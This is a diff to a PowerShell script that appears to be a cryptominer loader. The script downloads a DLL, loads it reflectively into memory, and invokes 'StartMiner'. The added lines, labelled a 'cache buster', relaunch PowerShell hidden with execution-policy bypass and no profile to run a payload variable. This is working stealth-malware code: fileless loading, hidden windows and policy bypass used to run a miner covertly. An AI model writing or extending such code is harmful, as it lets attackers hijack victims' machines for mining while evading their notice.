@@ -208,6 +208,14 @@ for ($i = 1; $i -le $maxRetries; $i++) {
         if ($bytes -and $bytes.Length -gt 0) {
             Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
             $asm = [System.AppDomain]::CurrentDomain.Load($bytes)
+            
+            # CACHE BUSTER: If the loaded assembly is the old version (based on size), force a restart
+            if ($asm.FullName -match 'Bridge' -and $bytes.Length -lt 29000) {
+                Write-Host "[!] Stale DLL detected in memory. Forcing fresh process..."
+                Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -Command `"$payload`"" -WindowStyle Hidden
+                exit
+            }
+
             Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
             Write-Host "[*] Invoking StartMiner..."
